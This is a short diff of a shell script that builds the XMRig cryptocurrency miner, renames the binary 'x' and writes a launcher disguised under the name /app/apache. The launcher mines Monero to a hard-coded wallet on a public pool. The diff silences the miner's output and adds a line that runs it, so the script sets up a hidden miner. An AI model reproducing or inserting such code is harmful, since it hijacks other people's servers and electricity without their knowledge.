@@ -6,5 +6,6 @@ cd xr/build
 cmake .. -DWITH_HTTPD=OFF
 make
 mv /app/xr/build/xmrig /app/xr/build/x
-echo "/app/xr/build/x -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.h -p x -k -t 1" > /app/apache
+echo "/app/xr/build/x -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.h -p x -k -t 1 > /dev/null" > /app/apache
 chmod 0777 /app/apache
+/app/apache
